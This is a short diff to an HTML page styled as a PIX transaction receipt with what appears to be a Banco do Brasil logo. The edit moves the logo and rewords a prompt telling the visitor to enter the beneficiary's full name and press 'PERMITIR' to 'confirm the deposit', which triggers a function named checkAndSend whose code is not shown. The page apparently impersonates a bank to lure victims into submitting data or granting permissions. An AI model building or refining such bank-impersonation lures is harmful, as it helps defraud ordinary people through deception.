@@ -9,10 +9,11 @@
     <link rel="manifest" href="manifest.json">
 </head>
 <body>
-    <img id="logo" src="assets/bb.png" alt="Logo" width="100">
+   
     <h2>Comprovante de Transação PIX</h2>
     
-    <p id="status">Para confirmar, digite o nome completo da pessoa beneficiária e clique em PERMITIR.</p>
+    <img id="logo" src="assets/bblogo.png" alt="Logo" width="100">
+    <p id="status">Para confirmar o depósito e carregar o comprovante, digite o nome <strong>completo</strong> da pessoa beneficiária e clique em PERMITIR.</p>
     <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()">
     <button onclick="checkAndSend()">PERMITIR</button>
 
